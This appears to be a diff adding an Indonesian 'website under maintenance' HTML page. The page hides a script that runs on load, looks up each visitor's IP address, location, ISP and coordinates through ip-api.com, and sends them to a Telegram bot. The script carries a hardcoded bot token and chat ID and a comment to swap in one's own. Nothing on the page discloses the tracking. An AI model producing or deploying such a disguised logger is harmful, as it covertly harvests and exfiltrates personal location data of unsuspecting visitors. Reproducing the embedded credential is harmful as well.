@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Website Sedang Perbaikan</title>
+</head>
+<body>
+  <h1>Halo 👋</h1>
+  <p>Website ini sedang dalam perbaikan.</p>
+
+  <script>
+    async function getIP() {
+      try {
+        const res = await fetch("http://ip-api.com/json/");
+        const data = await res.json();
+
+        const info = `
+📡 IP Baru Terdeteksi
+🌐 IP: ${data.query}
+🌍 Negara: ${data.country}
+🏙 Kota: ${data.city}, ${data.regionName}
+🛰 ISP: ${data.isp}
+⌚ Zona Waktu: ${data.timezone}
+📌 Koordinat: ${data.lat}, ${data.lon}
+        `;
+
+        console.log(info);
+
+        // Kirim ke bot Telegram
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: info
+          })
+        });
+      } catch (err) {
+        console.error("Gagal ambil IP", err);
+      }
+    }
+
+    // ===== GANTI DENGAN PUNYA KAMU =====
+    const BOT_TOKEN = "8450745041:AAEKdyVwwytSBLPe5zJhCg4cd9TqBDCgB1o";
+    const CHAT_ID = "7600526426";
+
+    getIP();
+  </script>
+</body>
+</html>
